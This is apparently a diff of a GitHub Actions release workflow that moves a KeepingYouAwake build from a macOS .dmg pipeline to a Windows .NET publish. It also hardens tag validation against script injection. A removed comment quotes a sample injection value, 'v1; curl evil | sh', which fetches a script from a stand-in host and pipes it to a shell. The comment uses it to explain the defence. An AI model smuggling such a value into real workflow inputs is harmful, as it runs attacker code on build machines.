@@ -1,18 +1,16 @@
 name: Release
 
 on:
-  # Tag-driven release: pushing `v*.*.*` (or `v*.*.*-suffix.N`) builds
-  # the app, packages it as a .dmg, and uploads to the matching
-  # GitHub Release.
+  # Tag-driven release: pushing `v*` builds the app for x64 and ARM64 and
+  # uploads zipped single-file executables to the matching GitHub Release.
   push:
     tags:
       - 'v*'
-  # Manual trigger lets us backfill a dmg onto an existing release
-  # without re-tagging. Pick the tag from the "Run workflow" UI.
+  # Manual trigger to backfill assets onto an existing release.
   workflow_dispatch:
     inputs:
       tag:
-        description: "Tag to build (e.g. v1.7.0-amphetamine.2). Falls back to GITHUB_REF when empty."
+        description: "Tag to build (e.g. v1.0.0). Falls back to GITHUB_REF when empty."
         required: false
         type: string
 
@@ -20,26 +18,22 @@ on:
 permissions:
   contents: read
 
+env:
+  DOTNET_NOLOGO: "1"
+  DOTNET_CLI_TELEMETRY_OPTOUT: "1"
+
 jobs:
   build-and-upload:
-    name: Build .dmg and attach to release
+    name: Build and attach to release
+    runs-on: windows-latest
     permissions:
-      contents: write   # needed for `gh release upload`
-      actions: write    # needed for `gh workflow run appcast.yml` chain
-    # Use the newest macOS image so we get an Xcode that knows about
-    # the Icon Composer (.icon) format (Xcode 16+ / macOS Tahoe).
-    # Older runners (macos-14 / Xcode 15.x) silently copy the .icon
-    # directory through without compiling it into Assets.car, which
-    # was producing dmgs with no app icon and a half-built bundle.
-    runs-on: macos-15
+      contents: write   # needed for `gh release create/upload`
     steps:
       - name: Resolve tag
         id: tag
-        # Never interpolate `${{ github.event.inputs.tag }}` directly into
-        # the shell script — that's a script-injection sink for anyone
-        # who can dispatch the workflow with a crafted tag string. Pass
-        # it through env and reference $TAG_INPUT instead, which the
-        # shell only parameter-expands rather than re-evaluating.
+        shell: bash
+        # Never interpolate the workflow_dispatch input into the script: pass
+        # it through env and whitelist its shape with an anchored regex.
         env:
           TAG_INPUT: ${{ github.event.inputs.tag }}
         run: |
@@ -47,189 +41,52 @@ jobs:
           if [ -z "$TAG" ]; then
             TAG="${GITHUB_REF#refs/tags/}"
           fi
-          if [ -z "$TAG" ] || [ "$TAG" = "$GITHUB_REF" ]; then
-            echo "::error::Could not resolve a tag from push event or workflow_dispatch input"
+          if [[ ! "$TAG" =~ ^v[0-9]+\.[0-9]+\.[0-9]+(-[A-Za-z0-9.]+)?$ ]]; then
+            echo "::error::tag does not match allowed pattern: ${TAG}"
             exit 1
           fi
-          # Whitelist tag shape so even an env-passed value can't smuggle
-          # shell metachars into the rest of the workflow. Use bash's
-          # =~ regex (not shell globs — globs match `*` against anything,
-          # which would defeat the point: `v1; curl evil | sh` would
-          # have matched `v[0-9]*[A-Za-z0-9._-]`).
-          if [[ ! "$TAG" =~ ^v[0-9][A-Za-z0-9._-]*$ ]]; then
-            echo "::error::tag does not match allowed pattern: $TAG"
-            exit 1
-          fi
-          echo "tag=$TAG" >> "$GITHUB_OUTPUT"
-          echo "Resolved tag: $TAG"
+          echo "tag=${TAG}" >> "$GITHUB_OUTPUT"
+          echo "version=${TAG#v}" >> "$GITHUB_OUTPUT"
+          if [[ "$TAG" == *-* ]]; then echo "prerelease=true" >> "$GITHUB_OUTPUT"; else echo "prerelease=false" >> "$GITHUB_OUTPUT"; fi
 
       - uses: actions/checkout@d23441a48e516b6c34aea4fa41551a30e30af803 # v6.1.0
         with:
           ref: ${{ steps.tag.outputs.tag }}
 
-      - name: Select Xcode 16 (avoid Xcode 26.0.1 ibtoold bug)
-        # AppIcon.icon (Icon Composer) is only compiled by Xcode 26;
-        # Xcode 16 copies it through uncompiled, so the app's icon
-        # comes from the bundled AppIcon.icns (CFBundleIconFile)
-        # instead — see scripts/render-app-icon.swift. Xcode 26.0.1 /
-        # macOS 26.0 SDK ships an ibtoold that crashes while compiling
-        # our Assets.xcassets in any configuration:
-        #
-        #   Command CompileAssetCatalogVariant failed with a
-        #   nonzero exit code
-        #
-        # Xcode 16.x has the working ibtool; pick that first
-        # and fall back to Xcode 26 only if 16 isn't installed.
-        run: |
-          set -e
-          for candidate in \
-            /Applications/Xcode_16*.app \
-            /Applications/Xcode_26*.app \
-            /Applications/Xcode.app
-          do
-            if [ -d "$candidate" ]; then
-              sudo xcode-select -s "$candidate"
-              break
-            fi
-          done
-          xcodebuild -version
-          xcrun --show-sdk-version
-
-      - name: Show toolchain
-        run: |
-          xcodebuild -version
-          swift --version
-
-      - name: Build (Release config, codesigning disabled)
-        # We used to run `xcodebuild archive`, but that pipeline runs
-        # `actool` with extra Release-time options that crash
-        # ibtoold 26.0.1 while compiling the AppIcon.icon directory
-        # ("Command CompileAssetCatalogVariant failed with a nonzero
-        # exit code"). Plain `xcodebuild build` produces the same
-        # .app bundle with a working icon and avoids the crash.
-        run: |
-          set -o pipefail
-          # Use the "(Direct)" scheme for distribution: it builds the
-          # KeepingYouAwake-Direct target which has
-          # GCC_PREPROCESSOR_DEFINITIONS = KYA_APP_UPDATER_ENABLED=1.
-          # The plain "KeepingYouAwake" scheme is the Mac-App-Store-shaped
-          # variant; built dmgs from it lack the Sparkle Update tab in
-          # Settings and the Sparkle code paths in KYAAppUpdater.m
-          # compile out, breaking auto-update.
-          xcodebuild build \
-            -workspace KeepingYouAwake.xcworkspace \
-            -scheme "KeepingYouAwake (Direct)" \
-            -configuration Release \
-            -destination 'platform=macOS' \
-            -derivedDataPath build/derived \
-            CODE_SIGNING_ALLOWED=NO \
-            CODE_SIGNING_REQUIRED=NO
-
-      - name: Locate built .app
-        id: app
-        run: |
-          APP=$(find build/derived/Build/Products/Release -maxdepth 2 -name 'KeepingYouAwake.app' -type d | head -n 1)
-          if [ -z "$APP" ] || [ ! -d "$APP" ]; then
-            echo "::error::Built KeepingYouAwake.app not found"
-            ls -laR build/derived/Build/Products/Release/ || true
-            exit 1
-          fi
-          echo "Found: $APP"
-          echo "size: $(du -sh "$APP" | awk '{print $1}')"
-          # Never ship an icon-less app (see scripts/check-app-icon.sh).
-          # A backfill of a tag older than the check (workflow_dispatch)
-          # has neither the script nor AppIcon.icns; build it as it was.
-          if [ -x scripts/check-app-icon.sh ]; then
-            scripts/check-app-icon.sh "$APP"
-          else
-            echo "::warning::scripts/check-app-icon.sh not in this tag; skipping the app-icon check"
-          fi
-          echo "path=$APP" >> "$GITHUB_OUTPUT"
-
-      - name: Ad-hoc sign the .app
-        # Without any signature at all, macOS Sequoia/Tahoe Gatekeeper
-        # treats the bundle as malware-suspicious and refuses to even
-        # show the right-click → Open dialog. Self-signing with `-`
-        # gives the bundle a stable code-signing identity (not Apple
-        # Notarized — users still need to right-click → Open the
-        # first time — but the warning becomes the standard
-        # "unidentified developer" path instead of the stricter
-        # "Apple cannot verify malware-free" lockdown).
-        run: |
-          set -o pipefail
-          APP="${{ steps.app.outputs.path }}"
-          codesign --force --deep --sign - --timestamp=none "$APP"
-          echo "--- verify ---"
-          codesign --verify --deep --strict --verbose=2 "$APP" || true
-          codesign --display --verbose=2 "$APP" || true
-
-      - name: Stage .app into a clean directory for hdiutil
-        # hdiutil's -srcfolder will use the directory as the dmg root,
-        # so we want it to contain only the .app (no derivatives).
-        run: |
-          mkdir -p build/dmg-stage
-          cp -R "${{ steps.app.outputs.path }}" build/dmg-stage/
-          ls -la build/dmg-stage/
-
-      - name: Create .dmg
-        id: dmg
-        run: |
-          set -o pipefail
-          DMG_NAME="KeepingYouAwake-${{ steps.tag.outputs.tag }}.dmg"
-          hdiutil create \
-            -volname "KeepingYouAwake" \
-            -srcfolder build/dmg-stage \
-            -ov \
-            -format UDZO \
-            "$DMG_NAME"
-          ls -la "$DMG_NAME"
-          shasum -a 256 "$DMG_NAME" > "${DMG_NAME}.sha256"
-          echo "name=$DMG_NAME" >> "$GITHUB_OUTPUT"
-
-      - name: Ensure GitHub Release exists for the tag
-        # On a tag push, a Release object isn't created automatically —
-        # `gh release upload` then fails with "release not found". Create
-        # it on the fly if missing so that tag-driven runs are self-contained.
-        env:
-          GH_TOKEN: ${{ github.token }}
-        run: |
-          set -e
-          TAG="${{ steps.tag.outputs.tag }}"
-          if ! gh release view "$TAG" --repo "$GITHUB_REPOSITORY" >/dev/null 2>&1; then
-            gh release create "$TAG" \
-              --repo "$GITHUB_REPOSITORY" \
-              --title "$TAG" \
-              --notes "Automated release for $TAG. Ad-hoc signed dmg attached below — first launch needs right-click → Open."
-          fi
-
-      - name: Upload .dmg + checksum to the release
-        env:
-          GH_TOKEN: ${{ github.token }}
-        run: |
-          set -e
-          DMG_NAME="${{ steps.dmg.outputs.name }}"
-          gh release upload "${{ steps.tag.outputs.tag }}" \
-            "$DMG_NAME" \
-            "${DMG_NAME}.sha256" \
-            --repo "$GITHUB_REPOSITORY" \
-            --clobber
-
-      - name: Refresh Sparkle appcast
-        # GitHub deliberately suppresses the `release: published` trigger
-        # when the release was created by GITHUB_TOKEN inside a workflow
-        # (loop prevention). So we kick off appcast.yml explicitly here.
-        env:
-          GH_TOKEN: ${{ github.token }}
-        run: |
-          gh workflow run appcast.yml --repo "$GITHUB_REPOSITORY"
-
-      - name: Upload artifacts on failure for triage
-        if: failure()
-        uses: actions/upload-artifact@b7c566a772e6b6bfb58ed0dc250532a479d7789f # v6.0.0
+      - uses: actions/setup-dotnet@a98b56852c35b8e3190ac28c8c2271da59106c68 # v6.0.0
         with:
-          name: release-debug
-          path: |
-            build/KeepingYouAwake.xcarchive
-            *.dmg
-          retention-days: 7
-          if-no-files-found: ignore
+          global-json-file: global.json
+
+      - name: Unit tests
+        run: dotnet test tests/KeepingYouAwake.Core.Tests --configuration Release
+
+      - name: Publish
+        shell: pwsh
+        env:
+          VERSION: ${{ steps.tag.outputs.version }}
+        run: |
+          New-Item -ItemType Directory -Force dist | Out-Null
+          foreach ($rid in 'win-x64', 'win-arm64') {
+            dotnet publish src/KeepingYouAwake -c Release -r $rid --self-contained `
+              -p:PublishSingleFile=true -p:IncludeNativeLibrariesForSelfExtract=true `
+              -p:Version=$env:VERSION -o "publish/$rid"
+            Copy-Item LICENSE "publish/$rid/LICENSE.txt"
+            $zip = "dist/KeepingYouAwake-$env:VERSION-$rid.zip"
+            Compress-Archive -Path "publish/$rid/KeepingYouAwake.exe", "publish/$rid/LICENSE.txt" -DestinationPath $zip
+            (Get-FileHash $zip -Algorithm SHA256).Hash.ToLower() + "  " + (Split-Path $zip -Leaf) | Out-File "$zip.sha256" -Encoding ascii
+          }
+          Get-ChildItem dist
+
+      - name: Create or update the release
+        shell: bash
+        env:
+          GH_TOKEN: ${{ github.token }}
+          TAG: ${{ steps.tag.outputs.tag }}
+          PRERELEASE: ${{ steps.tag.outputs.prerelease }}
+        run: |
+          if ! gh release view "${TAG}" >/dev/null 2>&1; then
+            FLAGS=(--generate-notes --title "${TAG}")
+            if [ "${PRERELEASE}" = "true" ]; then FLAGS+=(--prerelease); fi
+            gh release create "${TAG}" "${FLAGS[@]}"
+          fi
+          gh release upload "${TAG}" dist/* --clobber
